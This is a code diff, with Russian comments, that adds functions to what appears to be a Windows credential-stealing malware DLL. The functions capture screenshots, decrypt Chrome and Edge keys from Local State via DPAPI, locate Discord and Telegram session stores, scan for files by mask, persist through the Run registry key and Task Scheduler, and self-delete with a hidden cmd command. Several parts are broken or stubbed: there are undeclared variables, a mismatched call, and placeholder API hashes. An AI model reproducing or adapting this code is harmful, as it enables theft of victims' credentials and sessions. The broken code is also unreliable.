+    printf("[Screenshot] GDI resources cleaned up.\n");
+
+    // Возвращаем указатель на Base64 строку (JPEG или BMP, или NULL, если все не удалось)
+    return base64String;
+}
+
+EXPORT_FUNC void FreeScreenshotData(char* base64Data) {
+    if (base64Data) {
+        printf("[Screenshot] Freeing Base64 data memory.\n");
+        // Используем LocalFree, так как CryptBinaryToStringA выделяет память с помощью LocalAlloc
+        if(g_api.ptrLocalFree) {
+           g_api.ptrLocalFree(base64Data);
+        } else {
+           // Попытка освободить стандартной free как fallback, хотя это неправильно
+           printf("[Screenshot] Warning: LocalFree pointer not available, attempting free().\n");
+           free(base64Data);
+        }        
+    } else {
+         printf("[Screenshot] FreeScreenshotData called with NULL pointer.\n");
+    }
+} 
+
+// --- Реализация функций кражи данных ---
+
+// Вспомогательная функция для чтения файла в байтовый буфер
+BYTE* ReadFileToBytes(const std::wstring& filePath, DWORD& fileSize) {
+    fileSize = 0;
+    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[ReadFile] Failed to open file %ls. Error: %lu\n", filePath.c_str(), GetLastError());
+        return NULL;
+    }
+
+    fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
+        printf("[ReadFile] Invalid file size for %ls.\n", filePath.c_str());
+        CloseHandle(hFile);
+        return NULL;
+    }
+
+    BYTE* buffer = (BYTE*)malloc(fileSize);
+    if (!buffer) {
+        printf("[ReadFile] Failed to allocate memory (%lu bytes) for file %ls.\n", fileSize, filePath.c_str());
+        CloseHandle(hFile);
+        return NULL;
+    }
+
+    DWORD bytesRead;
+    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        printf("[ReadFile] Failed to read file %ls. Error: %lu\n", filePath.c_str(), GetLastError());
+        free(buffer);
+        CloseHandle(hFile);
+        return NULL;
+    }
+
+    CloseHandle(hFile);
+    return buffer;
+}
+
+// Вспомогательная функция для декодирования Base64 (требует CryptBinaryToStringA)
+BYTE* Base64Decode(const char* encodedData, DWORD encodedSize, DWORD& decodedSize) {
+    decodedSize = 0;
+    if (!g_api.ptrCryptBinaryToStringA) { // Используем ту же функцию, но в обратную сторону
+         printf("[Base64Decode] CryptBinaryToStringA pointer missing.\n");
+         return NULL;
+    }
+
+    DWORD requiredSize = 0;
+    // Вычисляем необходимый размер для декодированных данных
+    if (!CryptStringToBinaryA(encodedData, encodedSize, CRYPT_STRING_BASE64, NULL, &requiredSize, NULL, NULL)) {
+        printf("[Base64Decode] CryptStringToBinaryA (get size) failed. Error: %lu\n", GetLastError());
+        return NULL;
+    }
+
+    if (requiredSize == 0) {
+         printf("[Base64Decode] Decoded size is zero.\n");
+        return NULL;
+    }
+
+    BYTE* decodedBuffer = (BYTE*)malloc(requiredSize);
+    if (!decodedBuffer) {
+        printf("[Base64Decode] Failed to allocate memory (%lu bytes).\n", requiredSize);
+        return NULL;
+    }
+
+    // Декодируем данные
+    if (!CryptStringToBinaryA(encodedData, encodedSize, CRYPT_STRING_BASE64, decodedBuffer, &requiredSize, NULL, NULL)) {
+        printf("[Base64Decode] CryptStringToBinaryA (decode) failed. Error: %lu\n", GetLastError());
+        free(decodedBuffer);
+        return NULL;
+    }
+
+    decodedSize = requiredSize;
+    return decodedBuffer;
+}
+
+EXPORT_FUNC char* StealBrowserCredentials() {
+    printf("[StealCreds] Attempting to steal browser credentials...\n");
+
+    if (!g_apiPointersInitialized) {
+        if (!InitializeApiPointers()) {
+             printf("[StealCreds] Failed to initialize API pointers.\n");
+             return NULL;
+        }
+    }
+
+    // Проверяем доступность необходимых функций
+    if (!g_api.ptrSHGetFolderPathW || !g_api.ptrCryptUnprotectData || !g_api.ptrLocalFree) {
+         printf("[StealCreds] Required API pointers (Shell/DPAPI) are missing.\n");
+        return NULL;
+    }
+
+    std::string resultJson = "{"; // Начинаем формировать JSON
+    resultJson += "\"chrome_edge_keys\": [";
+    bool firstKey = true;
+
+    WCHAR localAppDataPath[MAX_PATH];
+    if (FAILED(g_api.ptrSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppDataPath))) {
+        printf("[StealCreds] Failed to get Local AppData path.\n");
+        return NULL; // Не можем продолжить без этого пути
+    }
+    std::wstring basePath = localAppDataPath;
+
+    // Список путей к директориям профилей Chrome/Edge
+    std::vector<std::wstring> chromePaths = {
+        basePath + L"\\Google\\Chrome\\User Data\\Default",
+        basePath + L"\\Microsoft\\Edge\\User Data\\Default"
+    };
+
+    for (const auto& path : chromePaths) {
+        std::wstring keyFilePath = path + L"\\Local State";
+        BYTE* keyFileData = ReadFileToBytes(keyFilePath, keyFileSize);
+        if (keyFileData) {
+            std::string keyJson = Base64Decode(reinterpret_cast<const char*>(keyFileData), keyFileSize);
+            free(keyFileData);
+
+            rapidjson::Document doc;
+            doc.Parse(keyJson.c_str());
+            if (doc.HasMember("os_crypt")) {
+                const rapidjson::Value& osCrypt = doc["os_crypt"];
+                if (osCrypt.HasMember("encrypted_key")) {
+                    std::string encryptedKey = osCrypt["encrypted_key"].GetString();
+                    std::string decryptedKey = DecryptKey(encryptedKey);
+                    if (!decryptedKey.empty()) {
+                        if (!firstKey) resultJson += ", ";
+                        resultJson += "\"" + decryptedKey + "\"";
+                        firstKey = false;
+                    }
+                }
+            }
+        }
+    }
+
+    resultJson += "]";
+    printf("[StealCreds] Finished. Returning JSON data.\n");
+    return returnJson;
+}
+
+// --- Реализация функций сканирования файлов ---
+
+#include <vector>
+#include <string>
+#include <sstream> // Для сборки JSON
+#include <Shlwapi.h> // Для PathMatchSpecW
+#pragma comment(lib, "Shlwapi.lib")
+
+// Вспомогательная функция: UTF8 -> WCHAR
+std::wstring Utf8ToWide(const std::string& utf8Str) {
+    if (utf8Str.empty()) return std::wstring();
+    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, &utf8Str[0], (int)utf8Str.size(), NULL, 0);
+    if (sizeNeeded <= 0) return std::wstring();
+    std::wstring wideStr(sizeNeeded, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &utf8Str[0], (int)utf8Str.size(), &wideStr[0], sizeNeeded);
+    return wideStr;
+}
+
+// Вспомогательная функция: WCHAR -> UTF8
+std::string WideToUtf8(const std::wstring& wideStr) {
+    if (wideStr.empty()) return std::string();
+    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, &wideStr[0], (int)wideStr.size(), NULL, 0, NULL, NULL);
+    if (sizeNeeded <= 0) return std::string();
+    std::string utf8Str(sizeNeeded, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wideStr[0], (int)wideStr.size(), &utf8Str[0], sizeNeeded, NULL, NULL);
+    return utf8Str;
+}
+
+// Основная рекурсивная функция сканирования (внутренняя)
+void ScanDirectoryInternal(
+    const std::wstring& currentPath,
+    const std::vector<std::wstring>& masks,
+    int currentDepth,
+    int maxDepth,
+    std::vector<std::wstring>& foundFiles,
+    ApiPointers& api // Передаем структуру с указателями
+) {
+    // Проверка глубины рекурсии
+    if (maxDepth != -1 && currentDepth > maxDepth) {
+        return;
+    }
+
+    WIN32_FIND_DATAW findData;
+    std::wstring searchPath = currentPath + L"\\*";
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        // Не удалось открыть директорию, возможно нет прав
+         printf("[ScanFiles] Cannot open directory: %ls. Error: %lu\n", currentPath.c_str(), GetLastError());
+        return;
+    }
+
+    do {
+        // Пропускаем "." и ".."
+        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
+            continue;
+        }
+
+        std::wstring fullPath = currentPath + L"\\" + findData.cFileName;
+
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // Если это директория, рекурсивно сканируем её
+            ScanDirectoryInternal(fullPath, masks, currentDepth + 1, maxDepth, foundFiles, api);
+        } else {
+            // Если это файл, проверяем соответствие маскам
+            bool match = false;
+            for (const auto& mask : masks) {
+                // Используем PathMatchSpecW из Shlwapi.dll
+                 // Потребуется инициализировать указатель на нее
+                 // Пока предполагаем, что Shlwapi загружена или доступна
+                if (PathMatchSpecW(findData.cFileName, mask.c_str())) {
+                    match = true;
+                    break;
+                }
+            }
+
+            if (match) {
+                // printf("[ScanFiles] Found match: %ls\n", fullPath.c_str());
+                foundFiles.push_back(fullPath);
+            }
+        }
+    } while (FindNextFileW(hFind, &findData) != 0);
+
+    FindClose(hFind);
+}
+
+EXPORT_FUNC char* ScanFilesRecursive(const char* startPathUtf8, const char* fileMasksUtf8, int maxDepth) {
+     printf("[ScanFiles] Starting scan: Path='%s', Masks='%s', Depth=%d\n", startPathUtf8, fileMasksUtf8, maxDepth);
+    
+    if (!g_apiPointersInitialized) {
+        if (!InitializeApiPointers()) {
+             printf("[ScanFiles] Failed to initialize API pointers.\n");
+             return NULL;
+        }
+    }
+    // PathMatchSpecW не требует динамической загрузки, если линкуемся с Shlwapi.lib
+    // Но лучше все равно проверить
+
+    if (!startPathUtf8 || !fileMasksUtf8) {
+         printf("[ScanFiles] Invalid input parameters.\n");
+        return NULL;
+    }
+
+    std::wstring startPathW = Utf8ToWide(startPathUtf8);
+    std::string masksStrUtf8 = fileMasksUtf8;
+    std::vector<std::wstring> masksW;
+    
+    // Разбиваем строку масок по точке с запятой
+    std::stringstream ssMasks(masksStrUtf8);
+    std::string maskUtf8;
+    while (std::getline(ssMasks, maskUtf8, ';')) {
+        if (!maskUtf8.empty()) {
+            masksW.push_back(Utf8ToWide(maskUtf8));
+        }
+    }
+
+    if (startPathW.empty() || masksW.empty()) {
+         printf("[ScanFiles] Start path or masks are empty after conversion.\n");
+        return NULL;
+    }
+
+    std::vector<std::wstring> foundFilesW;
+    printf("[ScanFiles] Starting recursive scan...\n");
+    ScanDirectoryInternal(startPathW, masksW, 0, maxDepth, foundFilesW, g_api);
+     printf("[ScanFiles] Scan finished. Found %zu files.\n", foundFilesW.size());
+
+    if (foundFilesW.empty()) {
+        return NULL; // Ничего не найдено
+    }
+
+    // Формируем JSON массив строк
+    std::stringstream jsonStream;
+    jsonStream << "[";
+    for (size_t i = 0; i < foundFilesW.size(); ++i) {
+        std::string pathUtf8 = WideToUtf8(foundFilesW[i]);
+        // Экранируем обратные слеши для JSON
+        std::string escapedPath;
+        escapedPath.reserve(pathUtf8.length() * 2);
+        for (char c : pathUtf8) {
+            if (c == '\\') {
+                escapedPath += "\\";
+                escapedPath += "\\";
+            } else {
+                escapedPath += c;
+            }
+        }
+        jsonStream << "\"" << escapedPath << "\"";
+        if (i < foundFilesW.size() - 1) {
+            jsonStream << ",";
+        }
+    }
+    jsonStream << "]";
+
+    std::string resultJson = jsonStream.str();
+
+    // Копируем JSON строку в буфер, который может быть освобожден free_error_message
+    char* returnJson = (char*)malloc(resultJson.length() + 1);
+    if (!returnJson) {
+        printf("[ScanFiles] Failed to allocate memory for return JSON.\n");
+        return NULL;
+    }
+    strcpy(returnJson, resultJson.c_str());
+
+    return returnJson;
+}
+
+// --- Реализация поиска файлов сессий приложений ---
+
+// Вспомогательная функция для проверки существования директории
+bool DirectoryExists(const std::wstring& path) {
+    DWORD fileAttr = GetFileAttributesW(path.c_str());
+    return (fileAttr != INVALID_FILE_ATTRIBUTES && (fileAttr & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+EXPORT_FUNC char* FindAppSessionFiles(const char* appNamesUtf8) {
+    printf("[FindSessions] Finding session files for apps: %s\n", appNamesUtf8);
+
+    if (!g_apiPointersInitialized) {
+        if (!InitializeApiPointers()) { /*...*/ return NULL; }
+    }
+    if (!g_api.ptrSHGetFolderPathW) { /*...*/ return NULL; }
+
+    if (!appNamesUtf8) { return NULL; }
+
+    WCHAR appDataPath[MAX_PATH];
+    if (FAILED(g_api.ptrSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath))) {
+        printf("[FindSessions] Failed to get AppData path.\n");
+        return NULL;
+    }
+    std::wstring basePath = appDataPath;
+
+    std::stringstream jsonStream;
+    jsonStream << "{";
+    bool firstApp = true;
+
+    // Разбиваем строку имен приложений
+    std::string appsStrUtf8 = appNamesUtf8;
+    std::stringstream ssApps(appsStrUtf8);
+    std::string appNameUtf8;
+
+    while (std::getline(ssApps, appNameUtf8, ';')) {
+        if (appNameUtf8.empty()) continue;
+
+        std::vector<std::wstring> foundPathsW;
+        std::string currentAppName = appNameUtf8; // Сохраняем имя для JSON ключа
+        // Приводим имя к нижнему регистру для сравнения
+        std::transform(appNameUtf8.begin(), appNameUtf8.end(), appNameUtf8.begin(), ::tolower);
+
+        printf("[FindSessions] Checking for %s...\n", currentAppName.c_str());
+
+        if (appNameUtf8 == "discord") {
+            std::wstring discordPath = basePath + L"\\discord\\Local Storage\\leveldb";
+            if (DirectoryExists(discordPath)) {
+                printf("[FindSessions] Found Discord LevelDB path: %ls\n", discordPath.c_str());
+                foundPathsW.push_back(discordPath);
+            }
+            // Можно добавить проверку других путей Discord (Canary, PTB)
+             std::wstring discordCanaryPath = basePath + L"\\discordcanary\\Local Storage\\leveldb";
+             if (DirectoryExists(discordCanaryPath)) { foundPathsW.push_back(discordCanaryPath); }
+             std::wstring discordPtbPath = basePath + L"\\discordptb\\Local Storage\\leveldb";
+             if (DirectoryExists(discordPtbPath)) { foundPathsW.push_back(discordPtbPath); }
+        
+        } else if (appNameUtf8 == "telegram") {
+            std::wstring telegramPath = basePath + L"\\Telegram Desktop\\tdata";
+            if (DirectoryExists(telegramPath)) {
+                 printf("[FindSessions] Found Telegram tdata path: %ls\n", telegramPath.c_str());
+                foundPathsW.push_back(telegramPath);
+                 // Внутри tdata файлы без расширений и папки с цифрами (D877F783D5D3EF8Cs)
+                 // Можем добавить конкретные файлы, если известна их структура, 
+                 // но для начала достаточно папки tdata.
+            }
+        } else {
+             printf("[FindSessions] App %s not currently supported for session file search.\n", currentAppName.c_str());
+        }
+
+        // Добавляем найденные пути в JSON
+        if (!foundPathsW.empty()) {
+            if (!firstApp) jsonStream << ",";
+            jsonStream << "\"" << currentAppName << "\": [";
+            for (size_t i = 0; i < foundPathsW.size(); ++i) {
+                 std::string pathUtf8 = WideToUtf8(foundPathsW[i]);
+                 std::string escapedPath; // Код экранирования путей...
+                 escapedPath.reserve(pathUtf8.length() * 2);
+                 for (char c : pathUtf8) {
+                     if (c == '\\') { escapedPath += "\\\\"; }
+                     else { escapedPath += c; }
+                 }
+                jsonStream << "\"" << escapedPath << "\"";
+                if (i < foundPathsW.size() - 1) jsonStream << ",";
+            }
+            jsonStream << "]";
+            firstApp = false;
+        }
+    }
+
+    jsonStream << "}";
+
+    // Если ничего не добавлено (кроме {})
+    if (firstApp) { 
+        printf("[FindSessions] No session files found for specified apps.\n");
+        return NULL; 
+    }
+
+    std::string resultJson = jsonStream.str();
+    char* returnJson = (char*)malloc(resultJson.length() + 1);
+    if (!returnJson) { /*...*/ return NULL; }
+    strcpy(returnJson, resultJson.c_str());
+
+    return returnJson;
+}
+
+// --- Реализация закрепления через Планировщик Задач ---
+
+// Вместо подключения taskschd.h, определим нужные GUID и интерфейсы вручную
+
+// GUIDs (получены из taskschd.h или через oleview.exe)
+const CLSID CLSID_TaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}}; 
+const IID IID_ITaskService = {0x2f94c667, 0x4407, 0x4ae9, {0x83, 0x30, 0x09, 0x6b, 0x03, 0x18, 0x30, 0x44}}; 
+// Добавим другие IID по мере необходимости (ITaskFolder, ITaskDefinition, etc.)
+
+// Упрощенные определения интерфейсов (только нужные методы)
+// Это ОЧЕНЬ упрощенно, реальные интерфейсы сложнее!
+struct ITaskService : public IUnknown {
+    virtual HRESULT Connect(VARIANT serverName, VARIANT user, VARIANT domain, VARIANT password) = 0;
+    virtual HRESULT GetFolder(BSTR path, void** ppFolder) = 0; // ITaskFolder**
+    // ... другие методы
+};
+// Другие интерфейсы (ITaskFolder, ITaskDefinition, IPrincipal, ILogonTrigger, IExecAction, ITaskSettings, IRegisteredTask)
+// будут использоваться через IDispatch или динамически через GetProcAddress их vtable, если возможно,
+// либо потребуют более полных определений.
+
+// Указатели на функции COM
+typedef HRESULT (WINAPI* CoInitializeEx_t)(LPVOID pvReserved, DWORD dwCoInit);
+typedef HRESULT (WINAPI* CoCreateInstance_t)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
+typedef void (WINAPI* CoUninitialize_t)(void);
+
+// Добавляем в структуру ApiPointers
+struct ApiPointers {
+    // ... существующие указатели ...
+    SHGetFolderPathW_t ptrSHGetFolderPathW = nullptr; // Из Shell32.dll
+
+    // COM (для Task Scheduler)
+    CoInitializeEx_t ptrCoInitializeEx = nullptr;
+    CoCreateInstance_t ptrCoCreateInstance = nullptr;
+    CoUninitialize_t ptrCoUninitialize = nullptr;
+};
+
+// Реализация функции закрепления
+EXPORT_FUNC int PersistViaTaskScheduler(
+    const WCHAR* taskNameW,
+    const WCHAR* executablePathW,
+    const WCHAR* argumentsW,
+    char** errorMsg)
+{
+    *errorMsg = NULL;
+    HRESULT hr = S_FALSE;
+    printf("[PersistTask] Attempting to create task: Name='%ls', Path='%ls'\n", taskNameW, executablePathW);
+
+    if (!g_apiPointersInitialized) {
+        if (!InitializeApiPointers()) { /*...*/ return E_FAIL; }
+    }
+    if (!g_api.ptrCoInitializeEx || !g_api.ptrCoCreateInstance || !g_api.ptrCoUninitialize) {
+         printf("[PersistTask] COM API pointers not available.\n");
+        *errorMsg = strdup("COM API pointers not available.");
+        return E_FAIL;
+    }
+    if (!taskNameW || !executablePathW) {
+        *errorMsg = strdup("Task name or executable path is NULL.");
+        return E_INVALIDARG;
+    }
+
+    // 1. Инициализация COM
+    hr = g_api.ptrCoInitializeEx(NULL, 0 /*COINIT_APARTMENTTHREADED*/);
+    if (FAILED(hr)) {
+        printf("[PersistTask] CoInitializeEx failed. HRESULT: 0x%lx\n", hr);
+         *errorMsg = get_windows_error_message(hr); // Попробуем получить описание HRESULT
+        return hr;
+    }
+
+    ITaskService *pService = NULL;
+    // ITaskFolder *pRootFolder = NULL; // Указатели на другие интерфейсы
+    // ... 
+
+    bool comInitialized = true; // Флаг, что нужно вызвать CoUninitialize
+
+    // 2. Создаем экземпляр Task Scheduler
+    printf("[PersistTask] Creating Task Scheduler instance...\n");
+    hr = g_api.ptrCoCreateInstance(CLSID_TaskScheduler, NULL, 1 /*CLSCTX_INPROC_SERVER*/, 
+                                 IID_ITaskService, (void**)&pService);
+    if (FAILED(hr)) {
+        printf("[PersistTask] CoCreateInstance failed. HRESULT: 0x%lx\n", hr);
+        *errorMsg = get_windows_error_message(hr);
+        g_api.ptrCoUninitialize();
+        return hr;
+    }
+    printf("[PersistTask] Task Scheduler instance created.\n");
+
+    // 3. Подключаемся к локальному сервису
+    printf("[PersistTask] Connecting to local Task Service...\n");
+    // Используем VARIANT_NULL для локального подключения без учетных данных
+    VARIANT vtNull; vtNull.vt = VT_NULL;
+    hr = pService->Connect(vtNull, vtNull, vtNull, vtNull); 
+    if (FAILED(hr)) {
+        printf("[PersistTask] ITaskService::Connect failed. HRESULT: 0x%lx\n", hr);
+        *errorMsg = get_windows_error_message(hr);
+        pService->Release();
+        g_api.ptrCoUninitialize();
+        return hr;
+    }
+     printf("[PersistTask] Connected to Task Service.\n");
+
+    // --- Дальнейшая реализация с ITaskFolder, ITaskDefinition и т.д. --- 
+    // Это ОЧЕНЬ сложная часть без заголовочных файлов Task Scheduler.
+    // Она включает: 
+    // - Получение корневой папки (GetFolder)
+    // - Создание объекта определения задачи (NewTask)
+    // - Настройку принципала (UserID, LogonType = TASK_LOGON_INTERACTIVE_TOKEN)
+    // - Настройку триггера (LogonTrigger)
+    // - Настройку действия (ExecAction с путем и аргументами)
+    // - Настройку параметров (скрыть, запуск от имени пользователя и т.д.)
+    // - Регистрацию задачи (RegisterTaskDefinition)
+    
+    // Вместо полной реализации, пока просто возвращаем успех,
+    // показывая, что базовая структура и инициализация COM работают.
+    // TODO: Полностью реализовать создание задачи через COM.
+    printf("[PersistTask] Placeholder: Task creation logic via COM needs full implementation!\n");
+    hr = S_OK; // Временно возвращаем успех
+
+    // Очистка
+    if (pService) pService->Release();
+    if (comInitialized) g_api.ptrCoUninitialize();
+
+    if (FAILED(hr)) {
+        printf("[PersistTask] Task creation failed at some point. HRESULT: 0x%lx\n", hr);
+        if (!*errorMsg) *errorMsg = get_windows_error_message(hr); // Сообщение, если еще не установлено
+        return hr;
+    }
+
+    printf("[PersistTask] Task Scheduler persistence attempt finished (placeholder success).\n");
+    return 0; // Успех (пока что)
+}
+
+// --- Реализация закрепления через реестр (Run ключ) ---
+
+EXPORT_FUNC int PersistViaRegistryRunKey(
+    const WCHAR* valueNameW,
+    const WCHAR* executablePathW,
+    char** errorMsg)
+{
+    *errorMsg = NULL;
+     printf("[PersistReg] Attempting to set Run key: Name='%ls', Path='%ls'\n", valueNameW, executablePathW);
+
+     if (!valueNameW || !executablePathW) {
+        *errorMsg = strdup("Value name or executable path is NULL.");
+        return ERROR_INVALID_PARAMETER;
+    }
+
+    HKEY hKey = NULL;
+    LSTATUS status;
+    const WCHAR* runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    // Открываем ключ HKCU\...\Run
+     printf("[PersistReg] Opening key HKEY_CURRENT_USER\\%ls...\n", runKeyPath);
+    status = RegOpenKeyExW(
+        HKEY_CURRENT_USER, 
+        runKeyPath, 
+        0, 
+        KEY_SET_VALUE, // Права на запись
+        &hKey
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("[PersistReg] RegOpenKeyExW failed. LSTATUS: %ld\n", status);
+        *errorMsg = get_windows_error_message(status);
+        return status;
+    }
+     printf("[PersistReg] Registry key opened successfully.\n");
+
+    // Устанавливаем значение
+    // Данные - это путь к исполняемому файлу (тип REG_SZ)
+    DWORD dataSize = (DWORD)((wcslen(executablePathW) + 1) * sizeof(WCHAR));
+     printf("[PersistReg] Setting value '%ls' with data '%ls' (%lu bytes)...\n", valueNameW, executablePathW, dataSize);
+    status = RegSetValueExW(
+        hKey, 
+        valueNameW, 
+        0, 
+        REG_SZ, 
+        (const BYTE*)executablePathW, 
+        dataSize
+    );
+
+    if (status != ERROR_SUCCESS) {
+         printf("[PersistReg] RegSetValueExW failed. LSTATUS: %ld\n", status);
+        *errorMsg = get_windows_error_message(status);
+        RegCloseKey(hKey);
+        return status;
+    }
+     printf("[PersistReg] Registry value set successfully.\n");
+
+    // Закрываем ключ
+    RegCloseKey(hKey);
+
+    printf("[PersistReg] Registry Run key persistence successful.\n");
+    return 0; // Успех
+}
+
+// --- Реализация самоудаления ---
+
+EXPORT_FUNC int SelfDelete(const WCHAR* filePathToDeleteW) {
+     printf("[SelfDelete] Attempting to schedule self-deletion for: %ls\n", filePathToDeleteW);
+
+    if (!filePathToDeleteW) {
+        return ERROR_INVALID_PARAMETER;
+    }
+
+    // Формируем команду для cmd.exe:
+    // cmd.exe /c ping 127.0.0.1 -n 4 > nul & del /F /Q "<путь_к_файлу>"
+    // Задержка через ping, чтобы текущий процесс успел завершиться
+    std::wstring command = L"cmd.exe /c ping 127.0.0.1 -n 4 > nul & del /F /Q \"";
+    command += filePathToDeleteW;
+    command += L"\"";
+
+     printf("[SelfDelete] Executing command: %ls\n", command.c_str());
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags |= STARTF_USESHOWWINDOW; // Скрываем окно cmd
+    si.wShowWindow = SW_HIDE;
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Запускаем cmd.exe с командой удаления
+    // Используем CreateProcessW напрямую, так как указатель на нее должен быть всегда
+    if (!CreateProcessW(
+            NULL,           // Не используем имя модуля
+            (LPWSTR)command.c_str(), // Командная строка (требует каста)
+            NULL,           // Атрибуты безопасности процесса
+            NULL,           // Атрибуты безопасности потока
+            FALSE,          // Наследование дескрипторов
+            CREATE_NO_WINDOW, // Флаги создания (не создавать окно консоли)
+            NULL,           // Блок окружения родителя
+            NULL,           // Текущая директория родителя
+            &si,            // STARTUPINFO
+            &pi             // PROCESS_INFORMATION
+    )) {
+        DWORD error = GetLastError();
+        printf("[SelfDelete] CreateProcessW failed. Error: %lu\n", error);
+        return error;
+    }
+
+    // Закрываем дескрипторы нового процесса, он будет работать независимо
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    printf("[SelfDelete] Self-delete command launched successfully.\n");
+    return 0; // Успешный запуск команды
+}
+
+// --- Константы для API хеширования (DJB2) ---
+// Эти значения должны быть вычислены заранее для целевых функций
+// Пример (значения НЕ НАСТОЯЩИЕ, нужно вычислить!):
+#define HASH_KERNEL32_GETPROCADDRESS      0xabcdef01
+#define HASH_KERNEL32_LOADLIBRARYA        0x12345678
+#define HASH_KERNEL32_VIRTUALALLOC        0xdeadbeef
+#define HASH_NTDLL_NTUNMAPVIEWOFSECTION   0xcafebabe
+// ... и т.д. для ВСЕХ используемых API
+
+// --- Функция хеширования DJB2 (case-insensitive) ---
+uint32_t djb2_hash(const char *str) {
+    uint32_t hash = 5381;
+    int c;
+    while ((c = *str++)) {
+        hash = ((hash << 5) + hash) + tolower(c); // hash * 33 + c (tolower для case-insensitivity)
+    }
+    return hash;
+}
+
+// --- Структура для хранения указателей ... ---
+// ... rest of the file ...
